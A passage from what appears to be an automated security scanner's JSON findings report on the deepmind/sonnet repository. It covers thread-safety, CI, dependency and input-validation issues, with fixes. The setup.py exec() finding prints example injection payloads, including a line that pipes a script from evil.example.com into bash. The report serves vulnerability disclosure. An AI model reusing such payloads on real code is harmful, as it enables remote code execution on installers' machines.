        scanDuration: "",
        vigoliumVersion: "v0.0.1-alpha",
        results: [{"type":"finding","data":{"id":17,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-044","module_name":"The `sonnet/src/mixed_precision.py` module uses a module-level global variable `_mixed_precision_mode` to store the active precision mode. This variable is not thread-local and is accessed without any","module_type":"whitebox","finding_source":"archon","module_short":"mixed-precision-thread-safety","description":"## Summary\n\nThe `sonnet/src/mixed_precision.py` module uses a module-level global variable `_mixed_precision_mode` to store the active precision mode. This variable is not thread-local and is accessed without any locking mechanism. In multi-threaded Python serving environments, one thread calling `enable(tf.float16)` will silently change the precision mode for all concurrent threads, leading to unexpected type casting of tensors and potentially incorrect inference results. The authors explicitly acknowledge this defect in two TODO comments.\n\n## Location\n\n- **File**: `sonnet/src/mixed_precision.py`\n- **Line 26**: `_mixed_precision_mode = None` (module-level global, not `threading.local()`)\n- **Lines 30-37**: `enable(dtype)` sets global directly via `global _mixed_precision_mode`\n- **Lines 45-46**: `_get_mixed_precision_mode()` reads global directly\n- **Line 25**: `# TODO(loreno): Make this a thread local variable`\n- **Line 118**: `# TODO(loreno): Make this thread safe`\n\n## Attacker Control\n\nIn a multi-threaded ML serving environment (e.g., Flask/FastAPI with thread pool, TF Serving with Python preprocessing), an attacker who can trigger inference requests can control the timing of `enable()`/`disable()` calls relative to other threads' inference. By sending a request that triggers `enable(tf.float16)` while another thread is mid-inference, the attacker can cause the victim thread to use float16 precision instead of the expected float32.\n\n## Trust Boundary Crossed\n\nCross-tenant/cross-request boundary in multi-threaded serving: one request's precision mode setting affects all concurrent requests. This is a shared-state violation where one tenant's configuration bleeds into another tenant's execution context.\n\n## Impact\n\n- **Silent accuracy degradation**: float16 has lower precision than float32; inference results may be subtly incorrect\n- **NaN propagation**: Operations that are numerically stable in float32 may produce NaN in float16, causing cascading failures\n- **Model behavior manipulation**: An attacker who can control precision mode can cause the model to produce attacker-favorable outputs (e.g., bypass anomaly detection thresholds that depend on float32 precision)\n- **Denial of service**: Repeated precision mode flipping can cause intermittent NaN errors that are difficult to diagnose\n\n## Evidence\n\n1. **mixed_precision.py:26**: `_mixed_precision_mode = None` -- global, not thread-local\n2. **mixed_precision.py:36-37**: `enable()` uses `global _mixed_precision_mode` with no lock\n3. **mixed_precision.py:25**: `# TODO(loreno): Make this a thread local variable` -- author acknowledges\n4. **mixed_precision.py:118**: `# TODO(loreno): Make this thread safe` -- second acknowledgment\n5. **mixed_precision.py:117**: `_wrapper.seen_none` attribute is also shared across threads\n6. **No threading.local() or Lock usage**: `grep -r 'threading' sonnet/src/mixed_precision.py` returns no matches\n\n## Reproduction Steps\n\n1. Create a multi-threaded test:\n   ```python\n   import threading\n   import sonnet as snt\n   from sonnet.src import mixed_precision\n   import tensorflow as tf\n\n   results = {}\n\n   def thread_a():\n       mixed_precision.enable(tf.float16)\n       import time; time.sleep(0.1)\n       results['a'] = mixed_precision._get_mixed_precision_mode()\n\n   def thread_b():\n       import time; time.sleep(0.05)\n       results['b'] = mixed_precision._get_mixed_precision_mode()\n\n   mixed_precision.disable()  # Start with None\n   t1 = threading.Thread(target=thread_a)\n   t2 = threading.Thread(target=thread_b)\n   t1.start(); t2.start()\n   t1.join(); t2.join()\n\n   # Thread B sees float16 even though it never called enable()\n   assert results['b'] == tf.float16  # Cross-thread contamination\n   ```\n\n2. Verify that `_mixed_precision_mode` is visible across threads\n\n**Recommended fix**: Replace the module-level global with `threading.local()`:\n```python\nimport threading\n_thread_local = threading.local()\n\ndef enable(dtype):\n    _thread_local.mixed_precision_mode = dtype\n\ndef _get_mixed_precision_mode():\n    return getattr(_thread_local, 'mixed_precision_mode', None)\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/mixed_precision.py","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/mixed_precision.py"],"finding_hash":"b6565cc2c1e3d0710a3e5e8228f9a735","found_at":"2026-04-18T18:34:06.134297Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":16,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-043","module_name":"The CI workflow excludes the entire `sonnet/src/conformance/` test directory via `--ignore=sonnet/src/conformance/`. This directory contains the only tests that validate serialization security propert","module_type":"whitebox","finding_source":"archon","module_short":"ci-conformance-exclusion","description":"## Summary\n\nThe CI workflow excludes the entire `sonnet/src/conformance/` test directory via `--ignore=sonnet/src/conformance/`. This directory contains the only tests that validate serialization security properties: `pickle_test.py` (pickle round-trip behavior), `saved_model_test.py` (SavedModel save/load integrity), and `checkpoint_test.py` (checkpoint restore behavior). With these tests excluded from CI, any regression that breaks serialization security behavior (e.g., re-enabling unsafe pickle paths, introducing SavedModel vulnerabilities) would not be caught before merge.\n\n## Location\n\n- **File**: `.github/workflows/ci.yml`\n- **Line 35**: `pytest -n auto sonnet --ignore=sonnet/src/conformance/`\n- **Excluded tests**:\n  - `sonnet/src/conformance/pickle_test.py`\n  - `sonnet/src/conformance/saved_model_test.py`\n  - `sonnet/src/conformance/checkpoint_test.py`\n\n## Attacker Control\n\nA malicious contributor can modify serialization-affecting code (e.g., base.py Module class, once.py @once decorator) with confidence that the conformance test suite will not block the PR. The CI provides no automated gate for serialization security regressions.\n\n## Trust Boundary Crossed\n\nCI quality gate boundary: the conformance tests serve as a trust boundary between code changes and production behavior. By excluding them, the CI pipeline cannot enforce serialization safety invariants, weakening the overall security posture of the supply chain.\n\n## Impact\n\n- **Serialization regression blindness**: Changes that break pickle, SavedModel, or checkpoint security properties pass CI without detection\n- **Enables undetected introduction of deserialization vulnerabilities**: A malicious or negligent change to `base.py` that removes future pickle guards would not be caught\n- **Compounds with other findings**: This finding amplifies the risk of the pickle RCE finding (Chamber 1) by ensuring no automated test catches regressions\n\n## Evidence\n\n1. **ci.yml:35**: `pytest -n auto sonnet --ignore=sonnet/src/conformance/` -- explicit exclusion\n2. **Conformance directory contents**: pickle_test.py, saved_model_test.py, checkpoint_test.py, goldens.py, descriptors.py\n3. **No alternative conformance execution**: No other CI job or workflow runs conformance tests\n4. **Deep Probe PH-08**: Confirmed that CI excludes all conformance tests\n\n## Reproduction Steps\n\n1. Inspect ci.yml line 35: `pytest -n auto sonnet --ignore=sonnet/src/conformance/`\n2. List conformance tests: `ls sonnet/src/conformance/*_test.py`\n3. Search for alternative conformance test execution: `grep -r 'conformance' .github/` -- no other references\n4. Verify no separate conformance CI job exists\n\n**Recommended fix**: Add a separate CI job that runs conformance tests, or remove the `--ignore` directive:\n```yaml\n- name: Run conformance tests\n  run: pytest sonnet/src/conformance/ -v\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":".github/workflows/ci.yml","repo_name":"https://github.com/deepmind/sonnet","matched_at":[".github/workflows/ci.yml"],"finding_hash":"887c1330d9f993346e38d9739134dc55","found_at":"2026-04-18T18:34:06.134296Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":15,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-042","module_name":"The CI workflow `.github/workflows/ci.yml` uses GitHub Actions with mutable major-version tags (`actions/checkout@v2`, `actions/setup-python@v1`) instead of immutable SHA pins. These tags can be re-po","module_type":"whitebox","finding_source":"archon","module_short":"unpinned-ci-actions","description":"## Summary\n\nThe CI workflow `.github/workflows/ci.yml` uses GitHub Actions with mutable major-version tags (`actions/checkout@v2`, `actions/setup-python@v1`) instead of immutable SHA pins. These tags can be re-pointed by the action maintainer (or a compromised maintainer account) to arbitrary code. The workflow lacks a `permissions:` block, giving the GITHUB_TOKEN default write access to the repository, packages, and other scopes. A compromised action would execute with full CI runner privileges and repository write access.\n\n## Location\n\n- **File**: `.github/workflows/ci.yml`\n- **Line 20**: `uses: actions/checkout@v2` (mutable tag; current release is v4.2.2)\n- **Line 22**: `uses: actions/setup-python@v1` (mutable tag; current release is v5.x)\n- **Missing**: No `permissions:` block at workflow or job level\n\n## Attacker Control\n\nAn attacker who compromises the `actions/checkout` or `actions/setup-python` GitHub repository (or a maintainer account) can push a malicious update to the mutable `@v2` or `@v1` tag. All subsequent CI runs in the sonnet repository would execute the attacker's code. Mutable tags provide no integrity guarantee -- unlike SHA-pinned references, they can be changed at any time without the consuming repository's knowledge.\n\n## Trust Boundary Crossed\n\nThird-party GitHub Action -\u003e CI runner: the sonnet repository grants arbitrary code execution on its CI runners to whoever controls the `@v2`/`@v1` tag of the referenced actions. Without a `permissions:` block, the CI runner's GITHUB_TOKEN has write access to the repository, enabling the attacker to modify repository contents, create releases, or push commits.\n\n## Impact\n\n- **Arbitrary code execution** in CI runners on every push to v2 branch and every PR\n- **Repository write access** via GITHUB_TOKEN (no permissions block)\n- **Secret exfiltration**: CI runners may have access to repository secrets\n- **Supply-chain propagation**: Compromised CI could modify source code or publish malicious packages\n- **Lateral movement**: GITHUB_TOKEN write access enables modifying other workflows, creating releases\n\n## Evidence\n\n1. **ci.yml:20**: `uses: actions/checkout@v2` -- mutable tag, 2 major versions behind\n2. **ci.yml:22**: `uses: actions/setup-python@v1` -- mutable tag, 4 major versions behind\n3. **No permissions block**: Default GITHUB_TOKEN permissions are write for all scopes\n4. **DFD-6-ci-supply-chain reachability**: Confirmed reachable, ci.yml:20 and ci.yml:22 in path\n5. **Corroborating tools**: semgrep-63, semgrep-64 (automated detection), semgrep-76, semgrep-77 (manual audit)\n\n## Reproduction Steps\n\n1. Inspect `.github/workflows/ci.yml` lines 20 and 22 for mutable tag references\n2. Verify no SHA pinning: `grep -n '@[a-f0-9]\\{40\\}' .github/workflows/ci.yml` returns no matches\n3. Verify no permissions block: `grep -n 'permissions:' .github/workflows/ci.yml` returns no matches\n4. Compare current action versions: `actions/checkout` is at v4.2.2 (SHA: 11bd71901bbe5b1630ceea73d27597364c9af683), `actions/setup-python` is at v5.x\n\n**Recommended fix**:\n```yaml\npermissions:\n  contents: read\n\nsteps:\n  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n  - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":".github/workflows/ci.yml","repo_name":"https://github.com/deepmind/sonnet","matched_at":[".github/workflows/ci.yml"],"finding_hash":"e241327babb5feb43f8dba7fe11391d7","found_at":"2026-04-18T18:34:06.134295Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":14,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-041","module_name":"The dm-sonnet package specifies overly permissive dependency floor constraints that allow installation of TensorFlow and NumPy versions with known, exploitable CVEs. `setup.py` specifies `tensorflow\u003e=","module_type":"whitebox","finding_source":"archon","module_short":"stale-dependency-floors","description":"## Summary\n\nThe dm-sonnet package specifies overly permissive dependency floor constraints that allow installation of TensorFlow and NumPy versions with known, exploitable CVEs. `setup.py` specifies `tensorflow\u003e=2` in extras_require, allowing any TF version from 2.0.0 onward (676+ CVEs across the range). `requirements.txt` specifies `numpy\u003e=1.16.3`, allowing numpy versions with confirmed buffer overflow vulnerabilities (CVE-2021-33430, CVE-2021-41496). A Dependabot PR (cd67506) that would have tightened the TF pin was never merged.\n\n## Location\n\n- **File**: `setup.py`, lines 25-26:\n  ```python\n  'tensorflow': ['tensorflow\u003e=2'],\n  'tensorflow with gpu': ['tensorflow-gpu\u003e=2'],\n  ```\n- **File**: `requirements.txt`, line 2:\n  ```\n  numpy\u003e=1.16.3\n  ```\n- **CI pin (not user-facing)**: `requirements-tf.txt`, line 1: `tensorflow==2.12.0rc0`\n\n## Attacker Control\n\nThe attacker does not directly control dependency resolution. However, in constrained environments (corporate PyPI mirrors with limited versions, locked dependency files, offline package caches, or environments with `--no-deps` workarounds), the floor constraint permits installation of known-vulnerable versions. The attacker benefits from the vulnerable dependency being present at runtime.\n\n## Trust Boundary Crossed\n\nDependency supply chain boundary: the package metadata declares a wide range of acceptable dependency versions. Users trust that the declared constraints exclude known-vulnerable versions. The floor constraints violate this implicit trust by allowing versions carrying RCE, heap-use-after-free, and buffer overflow CVEs.\n\n## Impact\n\n- **TensorFlow 2.0.0-2.11.x**: Hundreds of CVEs including RCE (CVE-2023-33976), heap-use-after-free, type confusion, and integer overflow vulnerabilities in TF C++ ops\n- **NumPy 1.16.3-1.21.x**: CVE-2021-33430 (buffer overflow in `PyArray_NewFromDescr_int` when processing object-dtype arrays) and CVE-2021-41496 (buffer overflow in ndarray comparison operations)\n- **Impact scope**: Any application using dm-sonnet that resolves to a vulnerable dependency version is affected by the downstream CVEs\n\n## Evidence\n\n1. **setup.py:25**: `'tensorflow': ['tensorflow\u003e=2']` -- allows TF 2.0.0+\n2. **setup.py:26**: `'tensorflow with gpu': ['tensorflow-gpu\u003e=2']` -- same range for GPU variant\n3. **requirements.txt:2**: `numpy\u003e=1.16.3` -- allows numpy 1.16.3+\n4. **requirements-tf.txt:1**: `tensorflow==2.12.0rc0` -- CI-only pin, not applied to user installs\n5. **Dependabot PR cd67506**: Would have pinned TF to `==2.12.1`; never merged into v2 branch\n6. **Production numpy usage**: conv.py:158, reshape.py:52, batch_apply.py:130 all use `np.prod()` on shape values -- vulnerable numpy versions are exercised in production code paths\n\n## Reproduction Steps\n\n1. Create a constrained pip environment: `pip install dm-sonnet[tensorflow] tensorflow==2.5.0 numpy==1.19.0`\n2. Verify vulnerable versions installed: `pip show tensorflow numpy`\n3. Cross-reference installed versions against CVE databases (NVD, GitHub Advisory)\n4. TF 2.5.0 carries CVE-2021-37678 (RCE via crafted SavedModel), CVE-2021-41197 (heap OOB), among others\n5. numpy 1.19.0 carries CVE-2021-33430 (buffer overflow)\n\n**Recommended fix**:\n- Update setup.py: `'tensorflow': ['tensorflow\u003e=2.12.0']`\n- Update requirements.txt: `numpy\u003e=1.22.0`\n- Merge the pending Dependabot fix or create equivalent\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"setup.py","repo_name":"https://github.com/deepmind/sonnet","matched_at":["setup.py","requirements.txt"],"finding_hash":"4171c9d33543ea49a17d6a4cb0ef5b5f","found_at":"2026-04-18T18:34:06.134294Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":12,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-026","module_name":"`Embed.__call__` passes user-supplied integer indices directly to `tf.nn.embedding_lookup(self.embeddings, inputs)` without any bounds validation. Negative indices or indices exceeding `vocab_size` re","module_type":"whitebox","finding_source":"archon","module_short":"embed-index-oob","description":"## Summary\n\n`Embed.__call__` passes user-supplied integer indices directly to `tf.nn.embedding_lookup(self.embeddings, inputs)` without any bounds validation. Negative indices or indices exceeding `vocab_size` reach the C++ `GatherV2` kernel. On CPU with TF \u003c 2.10, this causes an out-of-bounds memory read. On GPU, out-of-range indices may return garbage embedding values. The `vocab_size` parameter stored at construction is never used for runtime index validation. The stale dependency floor (`tensorflow\u003e=2`) allows installation of TF versions where CPU OOB reads are unsafe.\n\n## Location\n\n- `sonnet/src/embed.py:97-102` -- `Embed.__call__()`: passes `inputs` to `tf.nn.embedding_lookup` without bounds check\n- `sonnet/src/embed.py:~80` -- `Embed.__init__()`: stores `vocab_size` but never uses it for runtime validation\n\n## Attacker Control\n\nAPI caller supplies integer tensor indices. In NLP serving, these are typically token IDs from a tokenizer. If the serving API allows raw integer input (e.g., custom tokenization), the attacker directly controls the indices. Even with server-side tokenization, adversarial text can produce unexpected token IDs if the tokenizer and embedding table are mismatched.\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied integer indices flow directly to TF kernel op without Sonnet-level bounds validation. Sonnet stores `vocab_size` but does not enforce `0 \u003c= indices \u003c vocab_size`. The trust gap is between Sonnet (which delegates to TF) and TF (which may or may not bounds-check depending on version and device).\n\n## Impact\n\n- **CPU, TF \u003c 2.10**: OOB memory read from embedding buffer -- potential information leakage or segfault (DoS)\n- **GPU**: Out-of-range indices may return garbage embedding values silently -- inference integrity corruption\n- **CPU, TF \u003e= 2.10**: `InvalidArgument` error raised (graceful failure, no memory corruption)\n\n## Evidence\n\n```python\n# embed.py (approximate)\nclass Embed(base.Module):\n    def __init__(self, vocab_size, embed_dim, ...):\n        self._vocab_size = vocab_size  # Stored but never checked at call time\n        # ...\n\n    def __call__(self, inputs):\n        # No bounds check: inputs could be negative or \u003e= vocab_size\n        return tf.nn.embedding_lookup(self.embeddings, inputs)\n```\n\nNo deep probe covered Embed specifically. The ideator identified this as a trust boundary confusion: Sonnet trusts TF to validate, TF trusts the caller. Tracer confirmed no validation exists in the Sonnet layer.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\nembed = snt.Embed(vocab_size=1000, embed_dim=64)\n# Initialize\nembed(tf.constant([0, 1, 2]))\n\n# Attack 1: Negative index\nresult = embed(tf.constant([-1]))\n# CPU TF \u003c 2.10: OOB memory read\n# CPU TF \u003e= 2.10: InvalidArgument error\n# GPU: may return garbage values\n\n# Attack 2: Index exceeding vocab_size\nresult = embed(tf.constant([99999]))\n# Same behavior spectrum as above\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/embed.py:97-102","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/embed.py:97-102"],"finding_hash":"9cb20b0de3eee751844e62bb67de731f","found_at":"2026-04-18T18:34:06.134292Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":13,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-040","module_name":"The `setup.py` file in dm-sonnet extracts the package version from `sonnet/__init__.py` by reading lines, filtering for those starting with `__version__`, and executing the matching line via `exec(lin","module_type":"whitebox","finding_source":"archon","module_short":"exec-setup-filter-bypass","description":"## Summary\n\nThe `setup.py` file in dm-sonnet extracts the package version from `sonnet/__init__.py` by reading lines, filtering for those starting with `__version__`, and executing the matching line via `exec(line, g)`. The `startswith('__version__')` filter checks only the prefix of the line and does not restrict or validate the remainder. A supply-chain attacker who can modify `sonnet/__init__.py` (via compromised contributor account, malicious PR, or repository compromise) can craft a `__version__` line that passes the filter while executing arbitrary Python code during package installation.\n\n## Location\n\n- **File**: `setup.py`\n- **Function**: `_get_sonnet_version()` (lines 7-14)\n- **Vulnerable line**: Line 12: `exec(line, g)`\n- **Filter line**: Line 10: `if line.startswith('__version__')`\n- **Trigger**: Line 22: `_VERSION = _get_sonnet_version()` (called unconditionally at module load)\n\n## Attacker Control\n\nA supply-chain attacker with write access to `sonnet/__init__.py` controls the content of the line passed to `exec()`. The only gate is `startswith('__version__')`, which is trivially bypassed by any line beginning with that prefix. Examples of payloads that pass the filter:\n\n- `__version__ = \"1.0\"; __import__('os').system('curl https://evil.example.com/shell.sh | bash')`\n- `__version__ = \"1.0\"; exec(__import__('base64').b64decode('...'))`\n- `__version__ = (__import__('subprocess').check_output(['id']), \"1.0\")[1]`\n\nThe `g = {}` execution namespace provides no sandbox: Python automatically injects `__builtins__` into any empty dict passed to `exec()`, giving full access to `__import__`, `eval`, `exec`, `open`, and all built-in functions.\n\n## Trust Boundary Crossed\n\nSource tree integrity boundary: `setup.py` unconditionally trusts the content of `sonnet/__init__.py`. A contributor (or compromised contributor account) writing to `__init__.py` can escalate to arbitrary code execution on every machine that installs the package from source. This crosses from \"repository contributor\" privilege to \"code execution as the installing user\" -- which may be a CI runner with GITHUB_TOKEN write access, a developer workstation, or a production deployment pipeline.\n\n## Impact\n\n- **Arbitrary code execution** as the user running `pip install` from source\n- **CI compromise**: CI runners executing `pip install .` (as in ci.yml:31) run the payload with GITHUB_TOKEN access\n- **Supply-chain amplification**: A single malicious commit to `__init__.py` compromises all downstream installations from source\n- **Stealth**: The payload can set `__version__` to a valid value while executing side effects, leaving no visible trace in the installed package metadata\n\n## Evidence\n\n1. **setup.py:10-12** -- Filter and exec:\n   ```python\n   if line.startswith('__version__'):\n     g = {}\n     exec(line, g)  # pylint: disable=exec-used\n   ```\n\n2. **sonnet/__init__.py:150** -- Current benign value:\n   ```python\n   __version__ = \"2.0.3.dev\"\n   ```\n\n3. **DFD-5-exec-setup reachability slice**: path_count=1, shortest_path: setup.py:8 -\u003e setup.py:9 -\u003e setup.py:11 -\u003e setup.py:12. Confirmed reachable.\n\n4. **Corroborating tools**: semgrep-56 (custom rule with bypass analysis), semgrep-52 (standard exec detection), codeql-custom-29 (structural extraction). All three independently confirm the finding.\n\n5. **Deep Probe PH-01/07**: Empirically validated -- `g={}` provides no sandbox, `__builtins__` is auto-injected.\n\n## Reproduction Steps\n\n1. Clone the repository: `git clone https://github.com/deepmind/sonnet \u0026\u0026 cd sonnet \u0026\u0026 git checkout v2`\n2. Modify `sonnet/__init__.py` line 150 to: `__version__ = \"2.0.3.dev\"; __import__('os').system('echo PWNED \u003e /tmp/exec-proof')`\n3. Run `python setup.py --version` (or `pip install .`)\n4. Verify: `cat /tmp/exec-proof` shows \"PWNED\"\n5. The `startswith('__version__')` filter at setup.py:10 passes. The `exec()` at setup.py:12 executes the entire line including the injected command.\n\n**Recommended fix**: Replace `exec(line, g)` with a safe extraction pattern:\n```python\nimport re\nmatch = re.search(r\"^__version__\\s*=\\s*['\\\"]([^'\\\"]+)['\\\"]\", line)\nif match:\n    return match.group(1)\n```\nOr use `ast.literal_eval` on the RHS after splitting on `=`.\n\n## Cold Verification\n\n```\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: End-to-end reproduction succeeded -- crafted __version__ line passes startswith filter and exec() executes arbitrary code with full __builtins__ access, confirmed empirically on the actual codebase.\nSeverity-Final: MEDIUM\nPoC-Status: executed\n```\n\n### Verification Details\n\n**Sub-claim verification**:\n\n- **Sub-claim A (attacker controls input)**: CONFIRMED. `setup.py` line 8 opens `sonnet/__init__.py` and iterates raw lines. An attacker with write access to that file controls line content entirely.\n- **Sub-claim B (filter is insufficient)**: CONFIRMED. `setup.py` line 10 checks only `line.startswith('__version__')`. No regex, no character restriction, no length limit on the remainder. A semicolon followed by arbitrary Python passes the check.\n- **Sub-claim C (exec achieves code execution)**: CONFIRMED. `exec(line, g)` at line 12 with `g={}` provides full `__builtins__` access. Empirically verified: `__builtins__` is auto-injected by CPython, giving access to `__import__`, `open`, `eval`, and all built-in functions.\n\n**Code path trace**: `setup.py:22` (unconditional call) -\u003e `_get_sonnet_version()` -\u003e line 8 (open file) -\u003e line 9 (iterate) -\u003e line 10 (prefix-only filter) -\u003e line 11 (empty dict) -\u003e line 12 (`exec(line, g)`). No sanitization, no transformation, no framework protection at any point.\n\n**Protection surface**: No blocking protection found at any layer (language, framework, middleware, application, documentation). No SECURITY.md exists.\n\n**Reproduction**: Two successful attempts:\n1. Direct `exec()` call with crafted line: proof file created, version string set correctly.\n2. End-to-end via `_get_sonnet_version()` function: proof file `/tmp/exec-proof-setup` created with content \"PWNED_VIA_SETUP\", function returned \"2.0.3.dev\".\n\n**Severity downgrade rationale**: Downgraded from HIGH to MEDIUM because the attack requires write access to the source repository, which is a significant precondition. An attacker with that level of access could equally modify `setup.py` itself or any other Python file. The `exec()` pattern provides incremental stealth (hiding code in a metadata file rather than explicit build logic) but does not meaningfully expand the attack surface beyond what repository write access already grants.\n\nEvidence: `archon/real-env-evidence/exec-setup-filter-bypass/reproduction-log.txt`\nFull review: `archon/adversarial-reviews/exec-setup-filter-bypass-review.md`\n","severity":"high","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"setup.py","repo_name":"https://github.com/deepmind/sonnet","matched_at":["setup.py"],"finding_hash":"8852df850e04aaae6b6ced4d4752cddc","found_at":"2026-04-18T18:34:06.134292Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":11,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-025","module_name":"The GPU-specialized RNN paths `_cudnn_unrolled_lstm` (recurrent.py:1070) and `CuDNNGRU.__call__` (recurrent.py:1657) pass zero-batch-size or zero-step inputs directly to `tf.raw_ops.CudnnRNNV3` withou","module_type":"whitebox","finding_source":"archon","module_short":"cudnn-zero-crash","description":"## Summary\n\nThe GPU-specialized RNN paths `_cudnn_unrolled_lstm` (recurrent.py:1070) and `CuDNNGRU.__call__` (recurrent.py:1657) pass zero-batch-size or zero-step inputs directly to `tf.raw_ops.CudnnRNNV3` without validation. A zero-batch-size input produces an empty `sequence_lengths` tensor, causing a CuDNN kernel assertion failure. A zero-step input passes `max_sequence_length=0`, which also triggers a crash. Neither path validates input dimensions before calling the raw op.\n\n## Location\n\n- `sonnet/src/recurrent.py:1070-1091` -- `_cudnn_unrolled_lstm()`\n- `sonnet/src/recurrent.py:1072-1077` -- `max_sequence_length`, `batch_dim`, `sequence_lengths` computation\n- `sonnet/src/recurrent.py:1081` -- `tf.raw_ops.CudnnRNNV3(...)` call\n- `sonnet/src/recurrent.py:1657-1701` -- `CuDNNGRU.__call__()` -- same pattern\n\n## Attacker Control\n\nAPI caller supplies the `input_sequence` tensor. Zero-batch (`[T, 0, F]`) or zero-step (`[0, B, F]`) inputs directly trigger the crash.\n\n## Trust Boundary Crossed\n\nLibrary API boundary: caller-supplied tensor dimensions flow to GPU raw op without validation. The CuDNN kernel expects non-zero batch and step dimensions, but Sonnet does not enforce this.\n\n## Impact\n\nDoS -- CUDA kernel crash on GPU. GPU-specific: only affects deployments using CUDA/CuDNN. Behavior may vary by CuDNN version -- newer versions may handle empty inputs more gracefully. Standard batching infrastructure (TF Serving) typically ensures batch_size \u003e= 1, providing partial environmental mitigation.\n\n## Evidence\n\n```python\n# recurrent.py:1070-1091\ndef _cudnn_unrolled_lstm(input_sequence, initial_state, w_i, w_h, b):\n    max_sequence_length = tf.shape(input_sequence)[0]  # 0 if zero steps\n    batch_dim = tf.expand_dims(tf.shape(input_sequence)[1], axis=0)  # 0 if zero batch\n    sequence_lengths = tf.broadcast_to(max_sequence_length, batch_dim)  # empty if batch=0\n    output_sequence, all_hidden, all_cell, _, _ = tf.raw_ops.CudnnRNNV3(\n        input=input_sequence,\n        input_h=tf.expand_dims(initial_state.hidden, axis=0),\n        input_c=tf.expand_dims(initial_state.cell, axis=0),\n        sequence_lengths=sequence_lengths,  # empty tensor -\u003e CuDNN crash\n        # ...\n    )\n```\n\nDeep probe PH-18 confirmed zero-batch LSTM crash. PH-26 confirmed zero-step GRU crash.\n\n## Reproduction Steps\n\n```python\nimport sonnet as snt\nimport tensorflow as tf\n\n# Requires GPU with CuDNN\n\n# LSTM zero-batch crash\nlstm = snt.UnrolledLSTM(hidden_size=64)\nzero_batch = tf.zeros([10, 0, 32])  # Zero batch size\nstate = snt.LSTMState(hidden=tf.zeros([0, 64]), cell=tf.zeros([0, 64]))\nlstm(zero_batch, state)  # CuDNN assertion failure on GPU\n\n# GRU zero-step crash\ngru = snt.CuDNNGRU(hidden_size=64)\nzero_step = tf.zeros([0, 2, 32])  # Zero time steps\nstate = tf.zeros([2, 64])\ngru(zero_step, state)  # CuDNN crash on GPU\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-8","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/recurrent.py:1070-1091","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/recurrent.py:1070-1091","sonnet/src/recurrent.py:1072-1077","sonnet/src/recurrent.py:1081","sonnet/src/recurrent.py:1657-1701"],"finding_hash":"8891b03653c8d88afc964c208844e80a","found_at":"2026-04-18T18:34:06.134291Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":10,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-024","module_name":"`ConvNDTranspose._get_output_shape` (conv_transpose.py:185-206) computes `input_size * stride` using int32 arithmetic from `tf.shape()` for dynamic input shapes. When the product exceeds INT32_MAX (2^","module_type":"whitebox","finding_source":"archon","module_short":"conv-transpose-int32-overflow","description":"## Summary\n\n`ConvNDTranspose._get_output_shape` (conv_transpose.py:185-206) computes `input_size * stride` using int32 arithmetic from `tf.shape()` for dynamic input shapes. When the product exceeds INT32_MAX (2^31-1), the int32 multiplication overflows to a negative value. This negative output shape flows to `tf.nn.conv_transpose(output_shape=...)`, causing a TF kernel crash. This is the default code path -- `_get_output_shape` is called whenever `output_shape` is not explicitly provided at construction (line 125: `if self._output_shape is None`).\n\n## Location\n\n- `sonnet/src/conv_transpose.py:185-206` -- `ConvNDTranspose._get_output_shape()`\n- `sonnet/src/conv_transpose.py:186` -- `input_shape = ... tf.shape(inputs)` (int32)\n- `sonnet/src/conv_transpose.py:195` -- `smart_lambda(lambda x, y: x * y, input_size, stride)` (int32 overflow)\n- `sonnet/src/conv_transpose.py:125-135` -- default path calls `_get_output_shape` 